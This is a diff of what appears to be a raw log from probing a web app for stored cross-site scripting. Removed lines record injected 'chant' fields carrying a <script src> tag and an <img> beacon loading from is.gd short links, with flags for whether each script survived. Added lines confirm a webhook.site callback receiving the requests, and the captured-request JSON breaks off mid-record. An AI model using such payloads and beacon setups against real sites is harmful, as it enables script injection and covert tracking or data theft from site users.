@@ -1,9 +1,5 @@
-ANON box 241 200 chant= 'A wild cheer erupts: <script src=//is.gd/44Sj4M></script>!'
-   raw-script-present: True | img-beacon: False
-   len 2002
-ANON box 242 200 chant= 'A wild cheer erupts: <img src=//is.gd/t4YQzO>!'
-   raw-script-present: False | img-beacon: True
-   len 1781
-ANON box 1 200 chant= 'A wild cheer erupts: PIKA!'
-   raw-script-present: False | img-beacon: False
-   len 1772
+uuid b7ce5923-88a5-4f04-870a-3f4d792950bc
+direct webhook GET 200 https://webhook.site/b7ce5923-88a5-4f04-870a-3f4d792950bc/selftest?a=1 156
+is.gd 200 https://webhook.site/b7ce5923-88a5-4f04-870a-3f4d792950bc 156 text/html; charset=UTF-8
+api 200 application/json
+{"data":[{"uuid":"592aa4f1-430d-410b-aecf-2f5c3315ede4","type":"web","token_id":"b7ce5923-88a5-4f04-870a-3f4d792950bc","team_id":null,"ip":"48.217.148.83","country":"United States of America","country_code":"US","region":"Virginia","city":"Washington","hostname":"webhook.site","protocol":"http\/1.1","method":"GET","user_agent":"python-requests\/2.34.2","content":"","query":null,"headers":{"accept":["*\/*"],"accept-encoding":["gzip, deflate"],"user-agent":["python-requests\/2.34.2"],"host":["webhook.site"]},"url":"https:\/\/webhook.site\/b7ce5923-88a5-4f04-870a-3f4d792950bc","size":0,"files":[],"created_at":"2026-10-31 17:26:52","updated_at":"2026-10-31 17:26:52","sorting":1793467612391955,"custom_action_output":[],"custom_action_errors":[],"time":0.0008950233459472656},{"uuid":"7fc7c834-e9
